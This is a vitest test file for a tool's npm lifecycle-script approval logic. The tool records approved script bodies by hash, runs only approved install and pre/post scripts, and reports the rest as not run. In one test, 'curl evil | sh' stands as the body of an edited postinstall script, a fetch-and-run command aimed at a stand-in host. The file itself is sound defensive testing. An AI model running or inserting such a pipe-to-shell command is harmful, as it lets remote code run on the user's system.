import { appendFileSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  INSTALL_SCRIPTS,
  NO_SIBLINGS,
  bodyHash,
  declaredScripts,
  gateSiblings,
  hasLifecycleRecord,
  installScripts,
  lifecyclePath,
  notRunNote,
  notRunNoteFor,
  readApprovals,
  recordApprovals,
  statusOf,
  withSiblings,
} from "../../src/adapter/lifecycle.js";
import { gateEnv } from "../../src/adapter/normalize.js";
import { removeTree } from "../helpers.js";

/**
 * V-1⁷ (PRDR-233) — a project's own lifecycle scripts, approved one body at a
 * time: the record, what is declared, what a run executes of it, and the
 * environment that the run-wide switch no longer decides for a project with a
 * record.
 */

const roots: string[] = [];
afterEach(() => {
  for (const r of roots.splice(0)) removeTree(r);
});

function project(scripts: Record<string, unknown>): string {
  const dir = mkdtempSync(path.join(tmpdir(), "detent-lifecycle-"));
  roots.push(dir);
  writeFileSync(path.join(dir, "package.json"), `${JSON.stringify({ name: "x", private: true, scripts }, null, 2)}\n`);
  return dir;
}

const approve = (root: string, scripts: Record<string, string>, pkg = "."): void =>
  recordApprovals(
    root,
    Object.entries(scripts).map(([script, body]) => ({ package: pkg, script, body, sha256: bodyHash(body) })),
    "2026-10-02T10:00:00.000Z",
    "operator",
  );

describe("V-1⁷ what a manifest declares, and what the record approves (PRDR-233)", () => {
  it("declares the install's scripts and the pre and post of each gate script named, each with its body's hash", () => {
    const dir = project({ postinstall: "prisma generate", pretest: "touch PRE", test: "vitest", posttest: "touch POST", prebuild: "x", build: "tsc", other: "y" });
    const declared = declaredScripts(dir, ".", ["test"]);
    expect(declared.map((s) => s.script)).toEqual(["postinstall", "pretest", "posttest"]);
    expect(declared[0]).toEqual({ package: ".", script: "postinstall", body: "prisma generate", sha256: bodyHash("prisma generate") });
  });

  it("reads nothing from a manifest that is absent, does not parse, or holds no scripts object", () => {
    const missing = mkdtempSync(path.join(tmpdir(), "detent-lifecycle-"));
    roots.push(missing);
    expect(declaredScripts(missing, ".")).toEqual([]);
    writeFileSync(path.join(missing, "package.json"), "{ not json");
    expect(declaredScripts(missing, ".")).toEqual([]);
    expect(declaredScripts(project({}), ".")).toEqual([]);
    const odd = project({ postinstall: 3 });
    expect(declaredScripts(odd, ".")).toEqual([]);
  });

  it("an approval holds one body: the same body is approved, an edited one is not until approved again, and another package's is its own", () => {
    const root = project({ postinstall: "prisma generate" });
    expect(hasLifecycleRecord(root)).toBe(false);
    approve(root, { postinstall: "prisma generate" });
    expect(hasLifecycleRecord(root)).toBe(true);
    const approvals = readApprovals(root);
    const as = (body: string, pkg = "."): ReturnType<typeof statusOf> => statusOf(approvals, { package: pkg, script: "postinstall", body, sha256: bodyHash(body) });
    expect(as("prisma generate")).toBe("approved");
    expect(as("curl evil | sh")).toBe("edited since approved");
    expect(as("prisma generate", "packages/api")).toBe("not approved");
    expect(statusOf(approvals, { package: ".", script: "prepare", body: "tsc", sha256: bodyHash("tsc") })).toBe("not approved");
  });

  it("the record is appended, never rewritten, and a torn last line costs only that line", () => {
    const root = project({});
    approve(root, { postinstall: "a" });
    approve(root, { prepare: "b" });
    const lines = readFileSync(lifecyclePath(root), "utf8").trim().split("\n");
    expect(lines).toHaveLength(2);
    expect(JSON.parse(lines[0] ?? "")).toMatchObject({ package: ".", script: "postinstall", body: "a", sha256: bodyHash("a"), approved_by: "operator" });
    appendFileSync(lifecyclePath(root), '{"package":".","script":"prepu');
    expect([...readApprovals(root).hashes.keys()]).toEqual([".|postinstall", ".|prepare"]);
  });
});

describe("V-1⁷ what a run executes of them (PRDR-233)", () => {
  it("runs the approved install scripts in npm's order, preinstall before the install, and names the rest as not run", () => {
    const root = project({ prepare: "tsc", preinstall: "check", postinstall: "gen", install: "node-gyp rebuild" });
    approve(root, { prepare: "tsc", preinstall: "check", postinstall: "gen" });
    const plan = installScripts(root, ".", readApprovals(root));
    expect(plan.before).toEqual(["npm run 'preinstall'"]);
    expect(plan.after).toEqual(["npm run 'postinstall'", "npm run 'prepare'"]);
    expect(plan.notRun).toEqual([{ package: ".", script: "install", status: "not approved" }]);
    expect(INSTALL_SCRIPTS.indexOf("postinstall")).toBeLessThan(INSTALL_SCRIPTS.indexOf("prepare"));
  });

  it("keeps a digest of what is approved, which an approval or an edit changes, and none when nothing is", () => {
    const root = project({ postinstall: "gen", prepare: "tsc" });
    expect(installScripts(root, ".", readApprovals(root)).digest).toBe("");
    approve(root, { postinstall: "gen" });
    const one = installScripts(root, ".", readApprovals(root)).digest;
    approve(root, { prepare: "tsc" });
    const two = installScripts(root, ".", readApprovals(root)).digest;
    expect(one).not.toBe("");
    expect(two).not.toBe(one);
    writeFileSync(path.join(root, "package.json"), `${JSON.stringify({ scripts: { postinstall: "gen", prepare: "tsc --build" } })}\n`);
    expect(installScripts(root, ".", readApprovals(root)).digest).toBe(one);
  });

  it("quotes a script's name as one shell word", () => {
    const root = project({ "pretest:it's": "x", "test:it's": "y" });
    approve(root, { "pretest:it's": "x" });
    expect(gateSiblings(root, ".", "test:it's", readApprovals(root)).pre).toBe("npm run 'pretest:it'\\''s'");
  });

  it("finds a gate script's approved pre and post, and none that is unapproved or edited", () => {
    const root = project({ pretest: "gen", test: "vitest", posttest: "clean" });
    expect(gateSiblings(root, ".", "test", readApprovals(root))).toEqual(NO_SIBLINGS);
    approve(root, { pretest: "gen", posttest: "something else" });
    expect(gateSiblings(root, ".", "test", readApprovals(root))).toEqual({ pre: "npm run 'pretest'", post: null });
  });

  it("runs the siblings around the gate as npm does: a red pre is the result, post runs only after a green gate", async () => {
    const ran: string[] = [];
    const run = (red: readonly string[]) => async (command: string): Promise<{ green: boolean; command: string }> => {
      ran.push(command);
      return { green: !red.includes(command), command };
    };
    const both = { pre: "pre", post: "post" };
    expect(await withSiblings(both, run([]), () => run([])("gate"))).toEqual({ green: true, command: "gate" });
    expect(ran.splice(0)).toEqual(["pre", "gate", "post"]);
    expect(await withSiblings(both, run(["pre"]), () => run(["pre"])("gate"))).toEqual({ green: false, command: "pre" });
    expect(ran.splice(0)).toEqual(["pre"]);
    expect(await withSiblings(both, run(["gate"]), () => run(["gate"])("gate"))).toEqual({ green: false, command: "gate" });
    expect(ran.splice(0)).toEqual(["pre", "gate"]);
    expect(await withSiblings(both, run(["post"]), () => run(["post"])("gate"))).toEqual({ green: false, command: "post" });
    expect(ran.splice(0)).toEqual(["pre", "gate", "post"]);
    expect(await withSiblings(NO_SIBLINGS, run([]), () => run([])("gate"))).toEqual({ green: true, command: "gate" });
    expect(ran.splice(0)).toEqual(["gate"]);
  });

  it("tells a red gate's reader which declared scripts did not run and how to approve one, for npm only", () => {
    const root = project({ postinstall: "gen", pretest: "x", test: "y" });
    mkdirSync(path.join(root, "api"));
    writeFileSync(path.join(root, "api", "package.json"), `${JSON.stringify({ scripts: { prepare: "tsc" } })}\n`);
    approve(root, { postinstall: "other" });
    const approvals = readApprovals(root);
    const note = notRunNoteFor(root, ".", ["test"], approvals, null) ?? "";
    expect(note).toContain("postinstall (edited since approved), pretest (not approved)");
    expect(note).toContain("detent verify lifecycle --approve <script>");
    expect(notRunNoteFor(path.join(root, "api"), "api", [], approvals, "npm")).toContain("api: prepare (not approved)");
    expect(notRunNoteFor(root, ".", ["test"], approvals, "pnpm"), "pnpm's scripts are not Detent's to run").toBeNull();
    expect(notRunNote([])).toBeNull();
  });

  it("the run-wide switch lifts suppression only where no approval is on record, which supersedes it", () => {
    const root = project({ postinstall: "gen" });
    const on = { DETENT_ALLOW_LIFECYCLE_SCRIPTS: "1" };
    expect(gateEnv(root, {})).toEqual({ CI: "1", npm_config_ignore_scripts: "true" });
    expect(gateEnv(root, on)).toEqual({ CI: "1", npm_config_ignore_scripts: "false" });
    approve(root, { postinstall: "gen" });
    expect(gateEnv(root, on), "a project with a record runs its approved scripts and no others").toEqual({ CI: "1", npm_config_ignore_scripts: "true" });
  });
});
